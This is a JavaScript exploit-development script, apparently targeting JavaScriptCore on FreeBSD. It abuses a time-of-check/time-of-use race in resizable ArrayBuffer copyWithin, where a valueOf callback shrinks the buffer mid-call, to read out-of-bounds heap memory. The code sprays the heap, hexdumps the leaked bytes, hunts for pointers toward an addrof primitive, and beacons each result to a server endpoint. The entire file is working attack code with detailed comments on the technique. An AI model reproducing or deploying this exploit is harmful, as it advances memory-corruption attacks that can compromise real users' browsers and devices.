/*
 * p418 -- addrof primitive via RAB copyWithin TOCTOU
 *
 * Strategy:
 * 1. Allocate RAB (4KB, max 16KB) + spray victim ABs (64 bytes each)
 * 2. Store JSObject references in victim TypedArrays via structuredClone trick
 *    OR: use Float64Array to store doubles that encode as pointers
 * 3. Trigger OOB memmove that shifts victim data by a controlled offset
 * 4. Read back shifted data to leak adjacent heap metadata
 *
 * Alternative addrof: JSObject inline property storage
 * - An object with 1-2 properties stores them inline at cell+16, cell+24
 * - If we can read raw bytes from that memory region, we get pointer values
 * - BUT we need to read the cell memory, not the property values
 *
 * Best approach for no-JIT: use the OOB memmove to copy heap metadata
 * (object headers, pointers) INTO our readable AB backing store.
 *
 * Beacon prefix: V418-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V418-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

// Helper: float64 to hex pair
function f2h(f) {
  var tmp = new ArrayBuffer(8);
  new Float64Array(tmp)[0] = f;
  var u = new Uint32Array(tmp);
  return "0x" + (u[1]>>>0).toString(16).padStart(8,"0") + (u[0]>>>0).toString(16).padStart(8,"0");
}

// Helper: read Uint8Array region as hex
function hexdump(u8, off, len) {
  var s = "";
  for (var i = 0; i < len && off+i < u8.length; i++) {
    s += (u8[off+i] >>> 0).toString(16).padStart(2,"0");
  }
  return s;
}

// ================================================================
// Test 1: Reverse OOB -- copy FROM adjacent heap INTO our buffer
//
// Instead of overwriting victims, we want to READ what's next to us.
// copyWithin(dest, source): if source is past the buffer end after resize,
// memmove reads from OOB memory into our buffer.
//
// After resize(small), the buffer is small. But the stale length thinks
// it's big. copyWithin(0, 0) with length=big copies big bytes starting
// from offset 0 of the (now small) buffer.
//
// The key: after resize(0), the buffer pointer still points to the
// ORIGINAL allocation (bmalloc keeps it mapped). Reading from there
// reads whatever bmalloc put in that memory -- which might include
// freed metadata or adjacent allocation headers.
//
// Better: resize to a SMALL size, not 0. The first N bytes are still
// the buffer's real data. Bytes N..oldLength are OOB heap data.
// copyWithin(0, N) copies bytes from offset N into offset 0.
// After resize(small), offset N is OOB. memmove reads OOB data
// and writes it to offset 0 (which is within the resized buffer).
// Then we can read offset 0 of the resized buffer to get the OOB data!
//
// WAIT: After resize, can we still read the buffer via the view?
// The view's length updates to match the new buffer size.
// So we'd only be able to read bytes 0..small-1.
// But those bytes now contain OOB data from the memmove!
// ================================================================

function test1_reverse_oob() {
  B("T1-START");

  // Fill heap holes
  var fillers = [];
  for (var i = 0; i < 128; i++) fillers.push(new ArrayBuffer(4096));

  // Create RAB
  var ab = new ArrayBuffer(4096, {maxByteLength: 16384});
  var u8 = new Uint8Array(ab);

  // Fill with recognizable pattern
  for (var i = 0; i < 4096; i++) u8[i] = i & 0xFF;

  // Allocate objects AFTER the RAB to put interesting data in adjacent memory
  var objs = [];
  for (var i = 0; i < 64; i++) {
    var o = {x: i, y: i * 2, z: "str" + i};
    objs.push(o);
  }

  // Also allocate some ArrayBuffers whose headers might be adjacent
  var nearABs = [];
  for (var i = 0; i < 32; i++) {
    nearABs.push(new ArrayBuffer(4096));
  }

  B("T1-ALLOC", {fillers: fillers.length, objs: objs.length, near: nearABs.length});

  // Grow RAB to 16KB to extend into adjacent memory
  ab.resize(16384);
  u8 = new Uint8Array(ab); // refresh view for new length

  // Fill entire buffer with marker
  for (var i = 0; i < 16384; i++) u8[i] = 0xBB;

  // Now the trick: copyWithin to shift OOB data into readable range
  // We want: copyWithin(0, 8192) -- copy from offset 8192 to offset 0
  // After resize to 256: buffer is 256 bytes but memmove uses stale length
  // memmove(ptr+0, ptr+8192, min(16384-max(0,8192), 16384-8192)) = memmove(ptr, ptr+8192, 8192)
  // ptr+8192 is now OOB after resize(256)
  // The data from ptr+8192 (OOB heap memory) gets written to ptr+0 (our buffer)
  // We can then read ptr+0..255 to see what was at the OOB location

  var sourceOffset = 4096; // read from 4KB past current buffer start
  var toctouOK = false;
  var resizedTo = 1024; // keep 1KB readable

  try {
    u8.copyWithin(0, {
      valueOf: function() {
        ab.resize(resizedTo);
        toctouOK = true;
        return sourceOffset;
      }
    });
  } catch(e) {
    B("T1-ERR", e.message);
    return null;
  }

  B("T1-TOCTOU", {ok: toctouOK, bufLen: ab.byteLength});

  if (!toctouOK) return null;

  // Now read back: bytes 0..resizedTo-1 should contain OOB data from sourceOffset
  var readView = new Uint8Array(ab);
  B("T1-READLEN", readView.length);

  // Check if data is different from our 0xBB marker
  var changed = 0;
  var firstNonBB = -1;
  for (var i = 0; i < readView.length; i++) {
    if (readView[i] !== 0xBB) {
      changed++;
      if (firstNonBB < 0) firstNonBB = i;
    }
  }

  B("T1-CHANGED", {count: changed, first: firstNonBB, total: readView.length});

  // Dump first 64 bytes as hex -- these should be OOB heap data
  var hex1 = hexdump(readView, 0, 64);
  B("T1-HEX-0", hex1);

  // Dump more chunks
  if (readView.length >= 128) {
    B("T1-HEX-64", hexdump(readView, 64, 64));
  }
  if (readView.length >= 256) {
    B("T1-HEX-128", hexdump(readView, 128, 64));
    B("T1-HEX-192", hexdump(readView, 192, 64));
  }
  if (readView.length >= 512) {
    B("T1-HEX-256", hexdump(readView, 256, 64));
    B("T1-HEX-384", hexdump(readView, 384, 64));
  }
  if (readView.length >= 1024) {
    B("T1-HEX-512", hexdump(readView, 512, 64));
    B("T1-HEX-768", hexdump(readView, 768, 64));
  }

  // Look for pointer-like patterns (8 bytes with high bits that look like addresses)
  var ptrs = [];
  var dv = new DataView(ab);
  for (var i = 0; i + 7 < readView.length; i += 8) {
    var lo = dv.getUint32(i, true);
    var hi = dv.getUint32(i + 4, true);
    // FreeBSD user pointers: typically 0x00000008XXXXXXXX or similar
    // Check for non-zero high word that's not our marker
    if (hi > 0 && hi < 0x00010000 && hi !== 0xBBBBBBBB && lo !== 0xBBBBBBBB) {
      ptrs.push({off: i, hi: "0x" + hi.toString(16).padStart(8,"0"), lo: "0x" + lo.toString(16).padStart(8,"0")});
    }
  }

  B("T1-PTRS", {count: ptrs.length});
  for (var k = 0; k < Math.min(8, ptrs.length); k++) {
    B("T1-PTR" + k, ptrs[k]);
  }

  return {changed: changed, ptrs: ptrs, ab: ab};
}

// ================================================================
// Test 2: Known-object leak
// Place a Float64Array backed by a separate AB next to the RAB,
// store a known double, then read the raw bytes from OOB to see
// how JSC encodes the value.
// ================================================================

function test2_known_leak() {
  B("T2-START");

  var fillers2 = [];
  for (var i = 0; i < 128; i++) fillers2.push(new ArrayBuffer(4096));

  var ab = new ArrayBuffer(4096, {maxByteLength: 16384});

  // Place known values in adjacent ABs
  var markers = [];
  for (var i = 0; i < 32; i++) {
    var m = new ArrayBuffer(64);
    var mv = new Float64Array(m);
    // Store recognizable bit patterns
    mv[0] = 1.8457939563e-314; // 0x0000DEAD00000000 as float64
    mv[1] = 6.828527034e-308;  // 0x00CAFE0000000000 as float64
    // Also store via Uint32
    var mu32 = new Uint32Array(m);
    mu32[4] = 0xDEADBEEF; // offset 16
    mu32[5] = 0xCAFEBABE; // offset 20
    mu32[6] = 0x41414141; // offset 24
    mu32[7] = 0x42424242; // offset 28
    markers.push({ab: m, f64: mv, u32: mu32});
  }

  B("T2-ALLOC", markers.length);

  // Grow and read OOB
  ab.resize(16384);
  var u8 = new Uint8Array(ab);
  for (var i = 0; i < 16384; i++) u8[i] = 0xCC; // different marker

  var toctouOK2 = false;
  try {
    u8.copyWithin(0, {
      valueOf: function() {
        ab.resize(2048);
        toctouOK2 = true;
        return 4096;
      }
    });
  } catch(e) {
    B("T2-ERR", e.message);
    return null;
  }

  B("T2-TOCTOU", {ok: toctouOK2});

  var rv = new Uint8Array(ab);
  var rdv = new DataView(ab);

  // Search for our marker values
  var deadbeefHits = [];
  var cafebabeHits = [];
  for (var i = 0; i + 3 < rv.length; i += 4) {
    var val = rdv.getUint32(i, true);
    if (val === 0xDEADBEEF) deadbeefHits.push(i);
    if (val === 0xCAFEBABE) cafebabeHits.push(i);
    if (val === 0x41414141) B("T2-4141-AT", i);
  }

  B("T2-DEADBEEF", {count: deadbeefHits.length, offsets: deadbeefHits.slice(0, 5)});
  B("T2-CAFEBABE", {count: cafebabeHits.length, offsets: cafebabeHits.slice(0, 5)});

  // If we found markers, dump surrounding context (might contain heap metadata)
  if (deadbeefHits.length > 0) {
    var off = deadbeefHits[0];
    var start = Math.max(0, off - 32);
    B("T2-CTX", hexdump(rv, start, 96));
  }
}

// ================================================================
// Test 3: Direct read -- grow the RAB, then read past old boundary
// without any memmove trick. If grow() doesn't zero the new pages,
// we might read stale heap data.
// ================================================================

function test3_grow_stale() {
  B("T3-START");

  // Allocate and free some objects to populate heap with data
  var temps = [];
  for (var i = 0; i < 256; i++) {
    temps.push(new ArrayBuffer(256));
    var tv = new Uint32Array(temps[temps.length-1]);
    tv[0] = 0xFACEFEED;
    tv[1] = 0x12345678;
  }
  // Don't free yet -- fill heap

  var ab = new ArrayBuffer(256, {maxByteLength: 65536});
  var u8 = new Uint8Array(ab);

  // Grow
  ab.resize(65536);
  u8 = new Uint8Array(ab);

  // Check if new region has stale data or is zeroed
  var nonZero = 0;
  var firstNZ = -1;
  for (var i = 256; i < 65536; i++) {
    if (u8[i] !== 0) {
      nonZero++;
      if (firstNZ < 0) firstNZ = i;
    }
  }

  B("T3-GROW", {newLen: ab.byteLength, nonZero: nonZero, firstNZ: firstNZ});

  if (nonZero > 0) {
    B("T3-HEX", hexdump(u8, firstNZ, 64));
    B("T3-STALE-FOUND", "stale heap data in grown region!");
  } else {
    B("T3-ZEROED", "all zeros -- grow initializes memory");
  }
}

// Run all tests
test1_reverse_oob();
test2_known_leak();
test3_grow_stale();

B("DONE");
})();
